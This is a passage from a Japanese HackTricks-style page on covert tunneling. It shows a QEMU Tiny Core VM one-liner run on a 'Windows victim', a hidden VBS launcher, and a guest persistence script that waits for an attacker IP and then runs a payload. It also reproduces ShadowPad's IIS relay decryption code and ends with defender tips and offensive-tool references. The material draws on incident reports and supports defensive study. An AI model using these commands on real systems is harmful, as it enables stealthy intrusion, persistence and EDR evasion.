QEMU の user-mode networking では、virtual network に root または administrator privilege は必要ありません。また、`-netdev user,hostfwd=...` により、host から guest への TCP、UDP、または UNIX connections の redirect が可能です。<sup>[[51]](#references)</sup> TrustedSec は、host-focused EDR が guest 内部の activity を見逃す可能性がある incident において、Tiny Core QEMU VM と reverse SSH tunnel の試行について記録しています。<sup>[[1]](#references)</sup>

### 簡単な one-liner
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 上記のコマンドは、256 MiBのguestメモリとqcow2ディスクイメージを備えた**Tiny Core Linux** guestを起動します。ディスクイメージはin-RAMディスクではありません。
• Windowsホストの**2222/tcp**ポートは、guest内部の**22/tcp**へ透過的にforwardされます。
• 攻撃者の視点では、targetが公開しているのは単に2222ポートです。そこに到達したパケットは、VM内で実行されているSSHサーバーによって処理されます。

### VBScriptを介してステルスに起動する

TrustedSecは、上記のインシデントでVBSによるQEMUの起動とTiny Coreイメージが使用されたことを確認しました。<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
`cscript.exe //B update.vbs` でスクリプトを実行すると、ウィンドウは非表示のままになります。<sup>[[1]](#references)</sup>

### ゲスト内での永続化

引用されたインシデントでは、stateless な Tiny Core guest において、`/opt/bootlocal.sh` と `/opt/filetool.lst` を通じて永続化を実現しています。<sup>[[1]](#references)</sup>

1. Payload を `/opt/123.out` に配置する
2. `/opt/bootlocal.sh` に追記する：

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. `home/tc` と `opt` を `/opt/filetool.lst` に追加し、シャットダウン時に Payload が `mydata.tgz` にパックされるようにする。

### Telemetry に関する考慮事項

• ホストには引き続き QEMU プロセス、qcow2 image、ホストから forward された listener が露出する。
• ホスト上のみを対象とするプロセススキャンでは guest のプロセスを調査できない場合があるが、virtualization による evasion が保証されるわけではない。network、QEMU、image の telemetry によって検出される可能性がある。<sup>[[1]](#references)[[51]](#references)</sup>

### Defender 向けのヒント

• ユーザーが書き込み可能なパスにある **予期しない QEMU/VirtualBox/KVM binaries** を alert の対象にする。
• `qemu-system*.exe` から発信される outbound connections を block する。
• QEMU の launch 直後に bind される、使用頻度の低い listening ports（2222、10022、…）を hunt する。

## `HttpAddUrl` を介した IIS/HTTP.sys relay nodes（ShadowPad）

Check Point は、ShadowPad の IIS module が、`HttpAddUrl` を通じて URL prefixes を bind することで、侵害された perimeter web servers を backdoor および relay nodes に変える仕組みを説明しています。<sup>[[3]](#references)</sup>

同じ report では、以下にまとめた defaults、wildcard listeners、packet decryption、relay queues、debug telemetry についても詳しく説明しています。<sup>[[3]](#references)</sup>

* **Config defaults** – module の JSON config で値が省略されている場合、実在性の高い IIS defaults（`Server: Microsoft-IIS/10.0`、`DocumentRoot: C:\inetpub\wwwroot`、`ErrorPage: C:\inetpub\custerr\en-US\404.htm`）に fallback する。これにより、benign な traffic には IIS が正しい branding で応答する。
* **Wildcard interception** – operators は、URL prefixes の semicolon-separated list（host と path の wildcards）を指定する。module は各 entry に対して `HttpAddUrl` を call するため、HTTP.sys が matching requests を malicious handler に route する。一致しない requests は通常の IIS behavior に fallback する。
* **Encrypted first packet** – request body の最初の 2 bytes に custom 32-bit PRNG の seed が格納される。その後の各 byte は、protocol parsing の前に生成された keystream と XOR される：

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module は 2 つの lists、「servers」（upstream nodes）と「clients」（downstream implants）を維持する。約 30 秒以内に heartbeat が届かない entry は prune される。両方の lists が空でない場合、最初の healthy な server と最初の healthy な client を pair にし、片側が close するまで両 socket 間で bytes を単純に pipe する。
* **Debug telemetry** – optional logging により、各 pairing の source IP、destination IP、forward された bytes の合計が記録される。investigators はこれらの breadcrumbs を使って、複数の victims にまたがる ShadowPad mesh を再構築した。

---

## 確認すべきその他の tools

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Shadow に潜む：QEMU Virtualization を介した Covert Tunnels](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell 以前：Storm-2603 の過去の Ransomware Operations を探る](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ink Dragon の内部：Stealthy Offensive Operation の Relay Network と内部動作を明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide：Firewall/IDS Restrictions の Bypass](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit：Metasploit における Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike：SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike：Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035：Domain Names - Implementation and Specification](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel overview](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
{{#include ../banners/hacktricks-training.md}}
